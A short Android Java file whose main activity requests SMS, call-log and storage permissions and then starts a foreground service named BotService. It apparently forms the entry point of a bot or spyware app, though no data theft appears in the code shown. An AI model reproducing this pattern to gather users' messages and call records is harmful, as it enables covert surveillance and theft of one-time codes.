package com.ollie.master;
import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.Manifest;
import android.os.Build;
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        String[] perms = new String[]{
            Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_EXTERNAL_STORAGE
        };
        if (Build.VERSION.SDK_INT >= 33) {
            requestPermissions(new String[]{ Manifest.permission.POST_NOTIFICATIONS, Manifest.permission.READ_MEDIA_IMAGES }, 1);
        }
        requestPermissions(perms, 2);
        startForegroundService(new Intent(this, BotService.class));
    }
}
